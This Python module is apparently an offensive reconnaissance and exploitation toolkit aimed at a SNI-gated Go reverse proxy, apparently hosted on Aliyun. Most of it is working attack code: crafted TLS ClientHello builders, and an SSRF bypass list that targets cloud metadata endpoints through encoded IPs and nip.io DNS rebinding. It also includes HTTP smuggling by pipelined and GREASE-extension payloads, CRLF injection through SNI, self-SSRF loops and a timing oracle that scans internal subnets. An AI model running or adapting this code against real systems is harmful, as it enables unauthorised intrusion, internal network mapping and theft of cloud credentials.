#!/usr/bin/env python3
"""
go_sniproxy_re — Reverse-engineering and exploitation primitives for bare
Golang net/http reverse-proxy infrastructure.

Target profile:
  :80   Golang net/http catch-all liveness probe (HTTP/1.0-only, no body, all paths → 200)
  :443  Golang httputil.ReverseProxy — no TLS, SNI-gated, hardcoded-or-SNI-derived upstream

Key RE findings encoded here:
  - Go ReverseProxy returns HTTP/1.1 502 Bad Gateway\\r\\n\\r\\n (bare, no extra headers)
    when upstream is DOWN. No Server header. Bare ReverseProxy discriminator.
  - Proxy responds ONLY when TLS ClientHello contains SNI extension. No SNI → silent drop.
  - SNI presence is the trigger; SNI content determines routing (SNI-derived) or is irrelevant
    (hardcoded upstream). discriminate_routing_mode() resolves this.
  - SSRF protection: RFC1918 / loopback / link-local blocked AFTER DNS resolution.
    Literal "127.0.0.1" blocked pre-DNS (<5ms EMPTY). DNS-resolved equivalents slower
    (nip.io adds ~600ms DNS RTT) — timing side channel for protection mode determination.
  - HTTP/1.0 catch-all: Go net/http default mux before any routes registered. Drops all
    HTTP/1.1 (requires Host header which shifts parsing). Pure liveness stub.

Attack surface:
  S1: Unauth TTS POST /tts on :443 (fires when backend wakes — kyutai-pocket-tts pattern)
  S2: SSRF via voice_url param (http/https/hf:// server-fetches)
  S3: SNI-routing redirect to attacker-controlled upstream (if routing mode = SNI-derived)
  S4: HTTP-over-TLS request injection (pipeline after ClientHello to HTTP upstream)
  S5: Self-SSRF via direct-IP SNI (proxy → itself → :80 catch-all → 200 breaks 502 gate)
  S6: Internal host timing oracle via SSRF protection response timing

Synthesized from:
  Go in Practice ch7 — net/http internals, httputil.ReverseProxy director function,
    HTTP/1.0 vs HTTP/1.1 connection semantics, custom transport dial hooks
  Go for DevOps ch11 — HTTP client patterns, raw TCP dial, TLS handshake mechanics
  Security with Go ch TLS — ClientHello structure, SNI extension parsing,
    TLS record layer format, raw handshake byte manipulation
  Hacking Cryptography ch.7 — timing side channels, response-timing oracle construction
"""

import concurrent.futures
import socket
import struct
import time
import datetime
import json
import os


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _finding(severity: str, title: str, detail: str,
             host: str, port: int) -> dict:
    return {"severity": severity, "title": title, "detail": detail,
            "host": host, "port": port}


def _tcp_probe(ip: str, port: int, payload: bytes,
               connect_timeout: float = 6.0,
               read_timeout: float = 9.0,
               pre_send_sleep: float = 0.15) -> tuple[float, bytes]:
    """
    Raw TCP probe. Returns (elapsed_seconds, response_bytes).
    Response sentinel bytes: b"__TIMEOUT__" | b"__RST__" | b"__ERR:...__"
    Elapsed is measured from payload send to last byte received.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(connect_timeout)
    try:
        s.connect((ip, port))
        if pre_send_sleep > 0:
            time.sleep(pre_send_sleep)
        t0 = time.monotonic()
        if payload:
            s.sendall(payload)
        s.settimeout(read_timeout)
        data = b""
        while len(data) < 16384:
            chunk = s.recv(2048)
            if not chunk:
                break
            data += chunk
        return time.monotonic() - t0, data
    except socket.timeout:
        return time.monotonic() - t0, b"__TIMEOUT__"
    except ConnectionResetError:
        return time.monotonic() - t0, b"__RST__"
    except Exception as e:
        return 0.0, f"__ERR:{e}__".encode()
    finally:
        try:
            s.close()
        except Exception:
            pass


def _http10_probe(ip: str, port: int, path: str = "/",
                  method: str = "GET", timeout: float = 8.0) -> str:
    """HTTP/1.0 probe — no Host header, matches Go catch-all behavior."""
    req = f"{method} {path} HTTP/1.0\r\n\r\n".encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.sendall(req)
        data = b""
        s.settimeout(5.0)
        while len(data) < 8192:
            chunk = s.recv(2048)
            if not chunk:
                break
            data += chunk
        return data.decode("utf-8", errors="replace")
    except Exception:
        return ""
    finally:
        try:
            s.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# TLS ClientHello construction
# ---------------------------------------------------------------------------

def build_clienthello(sni: str) -> bytes:
    """
    Minimal but structurally valid TLS ClientHello with SNI extension.
    Cipher suite list matches what Go's crypto/tls typically negotiates.
    Returns the full TLS record layer bytes.
    """
    sni_b = sni.encode("ascii", errors="replace")
    # SNI extension (type 0x0000): server_name_list → host_name entry
    sni_ext_data = (struct.pack(">H", len(sni_b) + 3)
                    + b"\x00"
                    + struct.pack(">H", len(sni_b))
                    + sni_b)
    sni_ext = b"\x00\x00" + struct.pack(">H", len(sni_ext_data)) + sni_ext_data
    rand = b"\x01" * 32
    ciphers = b"\xc0\x2c\xc0\x2b\xc0\x14\xc0\x0a\x00\x9d\x00\x9c\x00\x35\x00\x2f"
    comp = b"\x01\x00"  # 1 method, null compression
    ch = (b"\x03\x03"                               # legacy_version TLS 1.2
          + rand                                    # random (32 bytes)
          + b"\x00"                                 # session_id length=0
          + struct.pack(">H", len(ciphers)) + ciphers
          + comp
          + struct.pack(">H", len(sni_ext)) + sni_ext)
    hs = b"\x01" + struct.pack(">I", len(ch))[1:] + ch   # HandshakeType=ClientHello
    return b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs


def build_clienthello_injected(sni: str, extra_extensions: bytes) -> bytes:
    """
    TLS ClientHello with caller-supplied extension bytes appended after SNI.
    Used for: GREASE injection, HTTP-in-extension payloads, overflow probes.
    """
    sni_b = sni.encode("ascii", errors="replace")
    sni_ext_data = (struct.pack(">H", len(sni_b) + 3)
                    + b"\x00"
                    + struct.pack(">H", len(sni_b))
                    + sni_b)
    sni_ext = b"\x00\x00" + struct.pack(">H", len(sni_ext_data)) + sni_ext_data
    all_exts = sni_ext + extra_extensions
    rand = b"\x01" * 32
    ciphers = b"\xc0\x2c\xc0\x2b\xc0\x14\xc0\x0a\x00\x9d\x00\x9c\x00\x35\x00\x2f"
    comp = b"\x01\x00"
    ch = (b"\x03\x03" + rand + b"\x00"
          + struct.pack(">H", len(ciphers)) + ciphers
          + comp
          + struct.pack(">H", len(all_exts)) + all_exts)
    hs = b"\x01" + struct.pack(">I", len(ch))[1:] + ch
    return b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs


def build_nosni_clienthello() -> bytes:
    """TLS ClientHello with zero extensions — used to confirm SNI-as-trigger."""
    rand = b"\x01" * 32
    ciphers = b"\xc0\x2c\xc0\x2b\xc0\x14\xc0\x0a\x00\x9d\x00\x9c\x00\x35\x00\x2f"
    comp = b"\x01\x00"
    ch = (b"\x03\x03" + rand + b"\x00"
          + struct.pack(">H", len(ciphers)) + ciphers
          + comp
          + b"\x00\x00")  # extensions_length = 0
    hs = b"\x01" + struct.pack(">I", len(ch))[1:] + ch
    return b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs


def build_grease_extension(payload: bytes) -> bytes:
    """
    GREASE extension (type 0xFE0D) wrapping arbitrary payload.
    Extension bytes are forwarded verbatim to upstream by a passthrough proxy.
    Use to inject HTTP request bytes into the raw stream seen by HTTP backends.
    """
    return b"\xfe\x0d" + struct.pack(">H", len(payload)) + payload


# ---------------------------------------------------------------------------
# 1. Architecture fingerprinting
# ---------------------------------------------------------------------------

def fingerprint_go_catchall(ip: str, port: int = 80,
                             timeout: float = 6.0) -> list:
    """
    Detect bare Golang net/http catch-all (default mux, no routes registered).

    Discriminators:
      HTTP/1.0 GET / → 200 OK Content-Length:0 (no Server header, no body)
      HTTP/1.0 POST /arbitrary/nonexistent → 200 OK Content-Length:0
      HTTP/1.0 OPTIONS * → 200 OK Content-Length:0
      HTTP/1.1 GET / (with Host) → empty/drop (Go default mux requires Host)

    Returns findings:
      GO_HTTP10_CATCHALL   HIGH   — Go net/http catch-all liveness stub
      NOT_CATCHALL         INFO   — does not match catch-all pattern
    """
    findings = []

    def http10(method, path):
        return _http10_probe(ip, port, path, method, timeout)

    def http11(path):
        req = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((ip, port))
            s.sendall(req.encode())
            data = b""
            s.settimeout(4.0)
            while len(data) < 4096:
                c = s.recv(1024)
                if not c:
                    break
                data += c
            return data.decode("utf-8", errors="replace")
        except Exception:
            return ""
        finally:
            try:
                s.close()
            except Exception:
                pass

    root_10   = http10("GET", "/")
    nonex_10  = http10("POST", "/nonexistent/path/ablation-probe-xyz")
    opts_10   = http10("OPTIONS", "*")
    root_11   = http11("/")

    # Catch-all signature: all HTTP/1.0 paths → 200, HTTP/1.1 → silent drop
    all_200 = all("200 OK" in r for r in [root_10, nonex_10, opts_10] if r)
    h11_drops = len(root_11) == 0 or "200" not in root_11

    if all_200 and h11_drops:
        findings.append(_finding(
            "HIGH", "GO_HTTP10_CATCHALL",
            "Bare Golang net/http catch-all liveness probe. All HTTP/1.0 paths "
            "→ 200 Content-Length:0. No Server header. HTTP/1.1 drops silently. "
            "Pattern: Go net/http DefaultServeMux with no routes registered — "
            "pure infrastructure health stub, not the application layer.",
            ip, port))
    elif "200" in root_10:
        findings.append(_finding(
            "INFO", "HTTP10_200_PARTIAL",
            f"HTTP/1.0 GET / returns 200 but full catch-all pattern not confirmed. "
            f"root_10={root_10[:60]!r} nonex_10={nonex_10[:40]!r}",
            ip, port))
    else:
        findings.append(_finding(
            "INFO", "NOT_CATCHALL",
            f"Port {port} does not match Go catch-all pattern. "
            f"root_10={root_10[:60]!r}",
            ip, port))

    return findings


def fingerprint_go_reverse_proxy(ip: str, port: int = 443,
                                  sni: str = "",
                                  timeout: float = 10.0) -> list:
    """
    Detect bare Golang httputil.ReverseProxy (no TLS, SNI-gated).

    Discriminators:
      No SNI in ClientHello → connection drops silently (empty response)
      SNI present + upstream DOWN → "HTTP/1.1 502 Bad Gateway\\r\\n\\r\\n" (bare, 28 bytes)
      No Server header in 502 response (Go ReverseProxy adds none)
      Plain HTTP/1.0 or HTTP/1.1 → empty (proxy ignores non-TLS-hello input)

    Returns findings:
      GO_REVERSEPROXY_SNI_GATED     HIGH  — bare Go ReverseProxy, SNI-gated, backend DOWN
      GO_REVERSEPROXY_BACKEND_ALIVE CRIT  — backend UP (S1/S2 surface accessible)
      SNI_TRIGGER_ABSENT            INFO  — no SNI gating observed
    """
    findings = []
    if not sni:
        sni = ip

    # Probe 1: no SNI → should drop
    _, d_nosni = _tcp_probe(ip, port, build_nosni_clienthello(), 6.0, 5.0)

    # Probe 2: with SNI → should 502 if backend down
    t_sni, d_sni = _tcp_probe(ip, port, build_clienthello(sni), 6.0, timeout)

    # Probe 3: plain HTTP → should drop
    _, d_plain = _tcp_probe(ip, port, b"GET / HTTP/1.0\r\n\r\n", 6.0, 4.0)

    nosni_empty = len(d_nosni) == 0 or d_nosni == b"__TIMEOUT__"
    plain_empty = len(d_plain) == 0 or d_plain == b"__TIMEOUT__"
    has_sni_response = len(d_sni) > 0 and b"__" not in d_sni

    is_502 = b"502" in d_sni
    is_alive = has_sni_response and not is_502

    if nosni_empty and plain_empty and has_sni_response and is_502:
        findings.append(_finding(
            "HIGH", "GO_REVERSEPROXY_SNI_GATED",
            f"Bare Golang httputil.ReverseProxy. SNI present → "
            f"HTTP/1.1 502 Bad Gateway (upstream DOWN, {t_sni*1000:.0f}ms). "
            f"No SNI → silent drop. No TLS negotiation. No Server header. "
            f"Response: {d_sni[:60]!r}",
            ip, port))
    elif nosni_empty and plain_empty and is_alive:
        findings.append(_finding(
            "CRITICAL", "GO_REVERSEPROXY_BACKEND_ALIVE",
            f"Golang ReverseProxy backend IS UP. SNI response indicates live upstream. "
            f"Response ({t_sni*1000:.0f}ms): {d_sni[:120]!r}. "
            f"S1/S2 attack surface now accessible — deploy POST /tts and SSRF probes.",
            ip, port))
    else:
        findings.append(_finding(
            "INFO", "SNI_TRIGGER_ABSENT",
            f"Go ReverseProxy pattern not confirmed. "
            f"nosni={d_nosni[:30]!r} sni={d_sni[:30]!r} plain={d_plain[:30]!r}",
            ip, port))

    return findings


# ---------------------------------------------------------------------------
# 2. Routing mode discrimination — SNI-derived vs hardcoded upstream
# ---------------------------------------------------------------------------

def discriminate_routing_mode(ip: str, port: int = 443,
                               control_external: str = "",
                               timeout: float = 12.0) -> list:
    """
    Determine whether proxy routes connections to the SNI value (attacker-
    controllable upstream redirect) or to a hardcoded backend regardless of SNI.

    Method A — Canary SNI comparison: send known-public IPs and known-blocked
    IPs as SNI. If routing is SNI-derived, blocked-RFC1918 SNIs return fast-EMPTY
    while random public SNIs return slow-TIMEOUT (different upstream, different path).
    If hardcoded, all non-blocked SNIs produce identical timing (same upstream).

    Method B — External callback (requires attacker-controlled listener).
    If control_external is set ("host:port"), sends SNI = control_external's hostname,
    then checks if the proxy actually connected. Connection = SNI-derived routing.

    Returns findings:
      ROUTING_MODE_SNI_DERIVED    CRITICAL — upstream is SNI; proxy = open relay
      ROUTING_MODE_HARDCODED      INFO     — upstream hardcoded regardless of SNI
      ROUTING_MODE_AMBIGUOUS      INFO     — cannot determine from timing alone
    """
    findings = []

    def probe_sni(sni, to=timeout):
        t, d = _tcp_probe(ip, port, build_clienthello(sni), 6.0, to)
        return t, d

    # Probe a set of diverse SNI values; collect timing + response
    probes = {
        "self_ip":         probe_sni(ip, to=10.0),                  # same IP as target
        "random_public":   probe_sni("8.8.8.8", to=10.0),           # Google public DNS
        "random_public2":  probe_sni("1.1.1.1", to=10.0),           # Cloudflare
        "rfc1918_10":      probe_sni("10.0.0.1", to=4.0),           # RFC1918 → fast-EMPTY if blocked
        "loopback":        probe_sni("127.0.0.1", to=4.0),          # loopback → fast-EMPTY
        "nipio_127":       probe_sni("127.0.0.1.nip.io", to=6.0),   # DNS rebind → blocked post-DNS
    }

    # Classify each
    classified = {}
    for label, (t, d) in probes.items():
        if b"__TIMEOUT__" in d:
            cat = "TIMEOUT"
        elif len(d) == 0:
            cat = f"EMPTY-{t*1000:.0f}ms"
        elif b"502" in d:
            cat = f"502-{t*1000:.0f}ms"
        else:
            cat = f"DATA-{t*1000:.0f}ms"
        classified[label] = (t, d, cat)

    # Heuristic: if self_ip and random_public both return identical timing + 502,
    # upstream is hardcoded. If they differ (one fast-EMPTY, one slow-TIMEOUT),
    # routing is SNI-derived.
    self_502 = b"502" in probes["self_ip"][1]
    pub_502  = b"502" in probes["random_public"][1]
    pub2_502 = b"502" in probes["random_public2"][1]
    rfc_empty = len(probes["rfc1918_10"][1]) == 0 and probes["rfc1918_10"][0] < 0.5
    loop_empty = len(probes["loopback"][1]) == 0 and probes["loopback"][0] < 0.1

    summary = " | ".join(f"{k}={v[2]}" for k, v in classified.items())

    if self_502 and pub_502 and pub2_502 and rfc_empty:
        # All public IPs → 502 (same upstream) | RFC1918 → fast-EMPTY (SSRF block)
        # Strong signal: hardcoded upstream, SNI used only for SSRF guard
        findings.append(_finding(
            "INFO", "ROUTING_MODE_HARDCODED",
            f"Upstream appears hardcoded. All public-IP SNIs → 502 (same downstream). "
            f"RFC1918 SNIs → fast-EMPTY (SSRF protection confirmed). "
            f"SNI determines SSRF gate, not routing destination. "
            f"Probes: {summary}",
            ip, port))
    elif not self_502 and not pub_502 and rfc_empty:
        # Both time out rather than 502 — no hardcoded backend returning 502
        # Timeout difference between SNIs suggests SNI-derived routing
        t_self = probes["self_ip"][0]
        t_pub  = probes["random_public"][0]
        if abs(t_self - t_pub) > 1.0:
            findings.append(_finding(
                "CRITICAL", "ROUTING_MODE_SNI_DERIVED",
                f"Upstream routing appears SNI-derived. Timing divergence between "
                f"SNI=self ({t_self*1000:.0f}ms) vs SNI=external ({t_pub*1000:.0f}ms) "
                f"exceeds 1s threshold. Proxy acts as open relay — set SNI to any "
                f"external host to redirect proxy connections. "
                f"Probes: {summary}",
                ip, port))
        else:
            findings.append(_finding(
                "INFO", "ROUTING_MODE_AMBIGUOUS",
                f"Cannot determine routing mode from timing alone. "
                f"Probes: {summary}",
                ip, port))
    else:
        findings.append(_finding(
            "INFO", "ROUTING_MODE_AMBIGUOUS",
            f"Mixed signals. Manual review needed. Probes: {summary}",
            ip, port))

    return findings


# ---------------------------------------------------------------------------
# 3. SSRF protection analysis and bypass attempts
# ---------------------------------------------------------------------------

def probe_ssrf_protection(ip: str, port: int = 443,
                           timeout: float = 9.0) -> list:
    """
    Enumerate the SSRF protection layer of the Go ReverseProxy.

    Tests all known bypass vectors: decimal/hex/octal IP encoding, IPv6 variants,
    DNS rebind (nip.io), case variants, Aliyun IMDS (100.100.100.200).

    Timing interpretation:
      < 100ms EMPTY  = blocked before DNS (literal match, pre-resolution)
      < 800ms EMPTY  = blocked after DNS (post-resolution RFC1918 check)
      > 5000ms TIMEOUT = routed externally (public IP, no block)
      502 response   = reached configured upstream (not this SNI value)

    Returns findings:
      SSRF_PROTECTION_CONFIRMED      INFO     — RFC1918/loopback blocking confirmed
      SSRF_BYPASS_DNS_REBIND         HIGH     — DNS-resolved private IP NOT blocked
      SSRF_BYPASS_IMDS               CRITICAL — cloud IMDS reachable via proxy
      SSRF_BYPASS_ENCODING           HIGH     — IP encoding bypasses protection
      SSRF_BYPASS_SNI_DERIVED        CRITICAL — proxy routes SNI to internal host
    """
    findings = []

    def check(sni, to=6.0):
        t, d = _tcp_probe(ip, port, build_clienthello(sni), 5.0, to)
        is_empty = len(d) == 0
        is_timeout = b"__TIMEOUT__" in d
        is_502 = b"502" in d
        is_data = len(d) > 0 and not is_timeout and not is_502
        return t, d, is_empty, is_timeout, is_502, is_data

    vectors = [
        # (label, sni, max_ms_for_block_claim, expected=BLOCK|ROUTE|UNKNOWN)
        ("loopback-literal",       "127.0.0.1",         100,  "BLOCK"),
        ("loopback-decimal",       "2130706433",         500,  "BLOCK"),
        ("loopback-hex",           "0x7f000001",         500,  "BLOCK"),
        ("loopback-octal",         "0177.0.0.1",         500,  "BLOCK"),
        ("loopback-short",         "127.1",              500,  "BLOCK"),
        ("loopback-short2",        "127.0.1",            500,  "BLOCK"),
        ("localhost-literal",      "localhost",          500,  "BLOCK"),
        ("localhost-upper",        "LOCALHOST",          500,  "BLOCK"),
        ("ipv6-localhost",         "::1",                500,  "BLOCK"),
        ("ipv6-bracket",           "[::1]",              500,  "BLOCK"),
        ("ipv6-mapped",            "::ffff:127.0.0.1",   500,  "BLOCK"),
        ("ipv6-expanded",          "0:0:0:0:0:0:0:1",    500,  "BLOCK"),
        ("urlencode-dots",         "127%2e0%2e0%2e1",    500,  "BLOCK"),
        ("nipio-127",              "127.0.0.1.nip.io",  2000,  "BLOCK"),  # DNS latency
        ("nipio-192",              "192.168.1.1.nip.io",2000,  "BLOCK"),
        ("rfc1918-10",             "10.0.0.1",           500,  "BLOCK"),
        ("rfc1918-172",            "172.16.0.1",         500,  "BLOCK"),
        ("rfc1918-192",            "192.168.1.1",        500,  "BLOCK"),
        ("link-local",             "169.254.169.254",    500,  "BLOCK"),  # AWS IMDS
        ("aliyun-imds",            "100.100.100.200",   9000,  "BLOCK"),  # Aliyun IMDS (non-RFC1918)
        ("tencent-imds",           "metadata.tencentyun.com", 9000, "BLOCK"),
    ]

    blocked_count = 0
    bypass_found = False

    for label, sni, max_ms, expected in vectors:
        t, d, is_empty, is_timeout, is_502, is_data = check(sni, to=min(max_ms/1000 + 3.0, 12.0))
        ms = int(t * 1000)

        if is_data:
            # Got actual data — potential bypass
            bypass_found = True
            if "imds" in label or "169.254" in sni or "100.100" in sni:
                findings.append(_finding(
                    "CRITICAL", "SSRF_BYPASS_IMDS",
                    f"Cloud IMDS reachable via proxy SNI. "
                    f"SNI={sni!r} returned {len(d)} bytes in {ms}ms. "
                    f"Data: {d[:100]!r}",
                    ip, port))
            elif "nipio" in label:
                findings.append(_finding(
                    "HIGH", "SSRF_BYPASS_DNS_REBIND",
                    f"DNS rebind bypass: SNI={sni!r} (resolves to RFC1918) returned "
                    f"data in {ms}ms. Post-DNS RFC1918 check absent. "
                    f"Data: {d[:80]!r}",
                    ip, port))
            elif any(x in label for x in ["decimal", "hex", "octal", "urlencode", "short"]):
                findings.append(_finding(
                    "HIGH", "SSRF_BYPASS_ENCODING",
                    f"IP encoding bypass: SNI={sni!r} returned data in {ms}ms. "
                    f"SSRF protection misses encoded form. Data: {d[:80]!r}",
                    ip, port))
            else:
                findings.append(_finding(
                    "HIGH", "SSRF_BYPASS_SNI_DERIVED",
                    f"SNI={sni!r} returned data — potential internal host reached. "
                    f"{ms}ms. Data: {d[:80]!r}",
                    ip, port))
        elif is_empty and t < (max_ms / 1000):
            blocked_count += 1
        elif is_502 and "loopback" not in label and "rfc1918" not in label:
            # 502 means it reached the hardcoded upstream — pass
            pass

    if not bypass_found and blocked_count >= 3:
        findings.append(_finding(
            "INFO", "SSRF_PROTECTION_CONFIRMED",
            f"RFC1918 / loopback SSRF protection active. "
            f"{blocked_count}/{len(vectors)} vectors confirmed blocked. "
            f"Protection operates post-DNS-resolution based on nip.io timing.",
            ip, port))

    return findings


# ---------------------------------------------------------------------------
# 4. HTTP-over-TLS smuggling
# ---------------------------------------------------------------------------

def probe_http_smuggling(ip: str, port: int = 443,
                          sni: str = "",
                          timeout: float = 12.0) -> list:
    """
    HTTP-over-TLS request injection via pipelined payload after ClientHello.

    Theory: Go ReverseProxy sees TLS ClientHello → extracts SNI → dials upstream →
    bidirectional byte copy begins. When upstream is HTTP (FastAPI/uvicorn) and
    proxy does NOT re-wrap in TLS, the raw stream including the original ClientHello
    is forwarded verbatim to the HTTP backend.

    Technique 1 — Pipeline: TLS ClientHello + HTTP request in same TCP write.
      If proxy reads ClientHello, sends it upstream, then enters copy-mode,
      our HTTP bytes follow the ClientHello to the HTTP backend.
      Backend sees: [TLS binary garbage] [valid HTTP request]
      uvicorn/h11 may process the pipelined HTTP request.

    Technique 2 — Extension injection: embed HTTP request in GREASE extension.
      Extension bytes follow ClientHello in the stream. Passthrough proxy forwards
      extension bytes verbatim. Backend processes them as trailing stream data.

    Technique 3 — SNI-as-Host injection: craft SNI containing HTTP header bytes.
      Goal: if proxy uses SNI to set upstream Host header, inject CRLF.
      SNI = "target.com\\r\\nX-Injected: yes\\r\\nX-Auth-Bypass: 1"

    Returns findings:
      HTTP_SMUGGLING_RESPONSE      CRITICAL — HTTP response from backend via smuggled req
      HTTP_SMUGGLING_PARTIAL       HIGH     — abnormal response suggests partial processing
      HTTP_SMUGGLING_NO_RESPONSE   INFO     — backend didn't process smuggled request
      SNI_HEADER_INJECTION         HIGH     — CRLF in SNI processed by upstream
    """
    findings = []
    if not sni:
        sni = ip

    def probe(payload, label, to=timeout):
        t, d = _tcp_probe(ip, port, payload, 6.0, to)
        return t, d, label

    tls_pkt = build_clienthello(sni)

    # Technique 1: pipeline GET /openapi.json
    http_openapi = (
        b"GET /openapi.json HTTP/1.1\r\n"
        b"Host: " + ip.encode() + b"\r\n"
        b"Connection: close\r\n\r\n"
    )
    t1, d1, l1 = probe(tls_pkt + http_openapi, "pipeline-GET-openapi")

    # Technique 1b: pipeline POST /tts (TTS synthesis)
    body = b"------boundary\r\nContent-Disposition: form-data; name=\"text\"\r\n\r\nhello\r\n------boundary--\r\n"
    http_post = (
        b"POST /tts HTTP/1.1\r\n"
        b"Host: " + ip.encode() + b"\r\n"
        b"Content-Type: multipart/form-data; boundary=----boundary\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Connection: close\r\n\r\n"
        + body
    )
    t2, d2, l2 = probe(tls_pkt + http_post, "pipeline-POST-tts")

    # Technique 2: HTTP GET in GREASE extension
    http_health = b"GET /health HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n"
    ext_pkt = build_clienthello_injected(sni, build_grease_extension(http_health))
    t3, d3, l3 = probe(ext_pkt, "grease-ext-HTTP-GET")

    # Technique 3: CRLF injection in SNI
    injected_sni = f"{sni}\r\nX-Ablation-Inject: 1\r\nX-Forwarded-For: 127.0.0.1"
    try:
        crlf_pkt = build_clienthello(injected_sni)
        t4, d4, l4 = probe(crlf_pkt, "SNI-CRLF-injection")
    except Exception:
        d4 = b""
        l4 = "SNI-CRLF-injection"
        t4 = 0.0

    all_probes = [(t1, d1, l1), (t2, d2, l2), (t3, d3, l3), (t4, d4, l4)]

    http_markers = [b"HTTP/", b"200 OK", b"openapi", b"uvicorn", b"FastAPI",
                    b"application/json", b"text/plain", b"chunked"]

    for t, d, label in all_probes:
        if len(d) == 0 or b"__" in d:
            continue
        has_http = any(m in d for m in http_markers)
        is_502_only = b"502" in d and len(d) < 50
        is_extended = b"502" in d and len(d) > 50

        if has_http and not is_502_only:
            findings.append(_finding(
                "CRITICAL", "HTTP_SMUGGLING_RESPONSE",
                f"Backend HTTP response via smuggled request [{label}]. "
                f"{t*1000:.0f}ms. Data: {d[:200]!r}",
                ip, port))
        elif is_extended:
            findings.append(_finding(
                "HIGH", "HTTP_SMUGGLING_PARTIAL",
                f"Extended 502 response [{label}] — backend may be processing "
                f"pipelined payload. {t*1000:.0f}ms. Data: {d[:120]!r}",
                ip, port))

    if not any(
        f["title"] in ("HTTP_SMUGGLING_RESPONSE", "HTTP_SMUGGLING_PARTIAL")
        for f in findings
    ):
        findings.append(_finding(
            "INFO", "HTTP_SMUGGLING_NO_RESPONSE",
            "No HTTP response from smuggling probes. Backend likely DOWN or "
            "proxy terminates connection before forwarding pipelined data. "
            "Re-run when backend is alive.",
            ip, port))

    return findings


# ---------------------------------------------------------------------------
# 5. Self-SSRF probe — proxy routing to itself
# ---------------------------------------------------------------------------

def probe_self_ssrf(ip: str, proxy_port: int = 443,
                    health_port: int = 80,
                    timeout: float = 10.0) -> list:
    """
    Self-SSRF: set SNI = target IP to make proxy connect to itself.

    If proxy routing is SNI-derived, SNI = ip causes proxy to dial ip:upstream_port.
    If upstream_port happens to be :80 (catch-all), the catch-all returns 200 OK.
    This breaks the 502 gate: proxy → itself → 200 → proxy returns 200 to us.

    Distinguishes from hardcoded-502 by checking whether the response body
    contains HTTP/1.0 200 markers that the catch-all would inject.

    Additionally tests SNI = ip:80 (URL-style port specification) in case
    proxy parses port from SNI to determine upstream port.

    Returns findings:
      SELF_SSRF_LOOP_DETECTED    CRITICAL — proxy connected to itself; 200 returned
      SELF_SSRF_PORT_SPECIFIED   HIGH     — port in SNI accepted by proxy
    """
    findings = []

    # Baseline: what does normal SNI return?
    _, baseline = _tcp_probe(ip, proxy_port, build_clienthello(ip), 6.0, timeout)

    # SNI with port suffix — some proxies parse "host:port" from SNI
    port_sni_variants = [
        f"{ip}:80",
        f"{ip}:8080",
        f"{ip}:8000",
        f"{ip}:3000",
    ]

    for psni in port_sni_variants:
        t, d = _tcp_probe(ip, proxy_port, build_clienthello(psni), 6.0, timeout)
        if len(d) > 0 and b"__" not in d and d != baseline:
            is_200 = b"200" in d
            findings.append(_finding(
                "HIGH" if not is_200 else "CRITICAL",
                "SELF_SSRF_PORT_SPECIFIED" if not is_200 else "SELF_SSRF_LOOP_DETECTED",
                f"SNI={psni!r} returned different response than baseline. "
                f"{t*1000:.0f}ms. Response: {d[:120]!r}. "
                + ("Catch-all 200 detected — self-loop confirmed." if is_200 else
                   "Anomalous response — port parsing in SNI may be supported."),
                ip, proxy_port))

    # Direct self-IP SNI vs baseline comparison
    if b"200" in baseline and b"502" not in baseline:
        findings.append(_finding(
            "CRITICAL", "SELF_SSRF_LOOP_DETECTED",
            f"SNI={ip!r} (self) returned 200 — proxy connected to itself. "
            f"Self-SSRF loop active. Catch-all on :{health_port} is reachable "
            f"through the proxy via self-directed SNI.",
            ip, proxy_port))

    return findings


# ---------------------------------------------------------------------------
# 6. Internal timing oracle — side-channel subnet mapping
# ---------------------------------------------------------------------------

def probe_internal_timing_oracle(ip: str, port: int = 443,
                                  subnets: list = None,
                                  workers: int = 12,
                                  timeout: float = 5.0) -> dict:
    """
    Use SSRF protection response timing to map internal subnet structure.

    Timing model (observed on Aliyun Golang ReverseProxy):
      - RFC1918 blocked pre-DNS (literal "127.0.0.1"):  <10ms EMPTY
      - RFC1918 blocked post-DNS (via nip.io):           ~600ms EMPTY (DNS latency)
      - Public IP, external timeout:                     ~7200ms TIMEOUT
      - Hardcoded upstream reached:                       ~7200ms 502

    For each SNI that the proxy attempts to DNS-resolve and then connect to,
    a live internal host that REFUSED the connection returns faster than
    a dead/unreachable host (RST vs TIMEOUT).

    Probe strategy: use nip.io DNS rebind to force proxy to resolve then
    attempt connection to specific RFC1918 IPs. Fast-RST = port closed on
    live host. Slower-EMPTY = SSRF block before connection. TIMEOUT = unreachable.

    Returns raw timing data dict for manual analysis.
    """
    if subnets is None:
        # Aliyun VPC common ranges
        subnets = [
            "10.0.0",
            "10.0.1",
            "172.16.0",
            "192.168.0",
            "192.168.1",
        ]

    results = {}

    def probe_ip(internal_ip):
        # Use nip.io to force DNS resolution → RFC1918 result
        nip_sni = f"{internal_ip}.nip.io"
        t, d = _tcp_probe(ip, port, build_clienthello(nip_sni), 5.0, timeout)
        ms = int(t * 1000)
        if b"__TIMEOUT__" in d:
            cat = "TIMEOUT"
        elif len(d) == 0:
            cat = "EMPTY"
        elif b"__RST__" in d:
            cat = "RST"
        elif b"502" in d:
            cat = "502"
        else:
            cat = f"DATA:{len(d)}"
        return internal_ip, ms, cat

    all_targets = []
    for subnet in subnets:
        for host in range(1, 30):
            all_targets.append(f"{subnet}.{host}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(probe_ip, t) for t in all_targets]
        for f in concurrent.futures.as_completed(futs):
            try:
                host_ip, ms, cat = f.result()
                results[host_ip] = {"ms": ms, "cat": cat}
            except Exception:
                pass

    # Surface anomalies
    anomalies = {h: v for h, v in results.items()
                 if v["cat"] in ("RST", "DATA") or
                 (v["cat"] == "EMPTY" and v["ms"] < 100)}

    return {
        "total_probed": len(all_targets),
        "anomalies": anomalies,
        "raw": results,
    }


